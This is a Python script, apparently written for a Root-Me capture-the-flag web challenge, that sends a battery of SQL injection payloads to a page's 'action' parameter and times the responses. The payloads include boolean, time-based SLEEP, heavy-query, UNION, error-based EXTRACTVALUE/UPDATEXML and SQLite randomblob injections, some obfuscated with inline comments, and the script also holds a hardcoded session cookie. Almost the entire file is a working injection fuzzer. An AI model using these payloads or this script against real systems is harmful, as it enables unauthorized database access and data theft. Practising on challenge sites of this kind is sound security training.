#!/usr/bin/env python3
import requests
import time

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

def test_action(payload):
    params = {"action": payload}
    try:
        inicio = time.time()
        r = requests.get(URL, params=params, cookies=COOKIE, timeout=30)
        tiempo = time.time() - inicio
        return tiempo, len(r.text), r.text
    except:
        return 0, 0, ""

print("=" * 70)
print("  PROBANDO PARÁMETRO action")
print("=" * 70)

# Baseline
t, l, c = test_action("login")
print(f"Baseline: {t:.2f}s, {l} bytes")

# Payloads para action (basados en el PDF)
payloads = [
    # Boolean
    ("login' AND 1=1-- -", "AND TRUE"),
    ("login' AND 1=2-- -", "AND FALSE"),
    ("login' OR 1=1-- -", "OR TRUE"),
    ("login' OR 1=2-- -", "OR FALSE"),
    
    # Time-based (con comentarios)
    ("login' AND SLEEP(5)-- -", "SLEEP"),
    ("login'/**/AND/**/SLEEP(5)/**/-- -", "SLEEP con comentarios"),
    ("login' AND IF(1=1, SLEEP(5), 0)-- -", "IF SLEEP"),
    ("login'/**/AND/**/IF(1=1, SLEEP(5), 0)/**/-- -", "IF SLEEP con comentarios"),
    
    # Heavy query (del PDF)
    ("login' AND (SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1)-- -", "Heavy 2"),
    ("login' AND (SELECT COUNT(*) FROM information_schema.columns, information_schema.columns T1, information_schema.columns T2)-- -", "Heavy 3"),
    ("login'/**/AND/**/(SELECT/**/COUNT(*)/**/FROM/**/information_schema.columns,information_schema.columns/**/T1)/**/-- -", "Heavy con comentarios"),
    
    # UNION
    ("login' UNION SELECT 1,2,3-- -", "UNION 3"),
    ("login' UNION SELECT 1,2,3,4-- -", "UNION 4"),
    ("login'/**/UNION/**/SELECT/**/1,2,3/**/-- -", "UNION con comentarios"),
    
    # Error-based
    ("login' AND 1=CONVERT(int, @@version)-- -", "ERROR"),
    ("login' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))-- -", "EXTRACTVALUE"),
    ("login' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)-- -", "UPDATEXML"),
    ("login' AND 1/0-- -", "DIV/0"),
    
    # SQLite específico
    ("login' AND randomblob(100000000)-- -", "SQLite heavy"),
    ("login' AND 1=1-- -", "SQLite TRUE"),
    ("login' AND 1=2-- -", "SQLite FALSE"),
]

for payload, desc in payloads:
    t, l, c = test_action(payload)
    status = "✅" if t > 2 else "❌"
    print(f"{status} {desc:30} -> {t:.2f}s, {l} bytes")
    time.sleep(0.5)

print("\n" + "=" * 70)
print("  RESULTADO FINAL")
print("=" * 70)
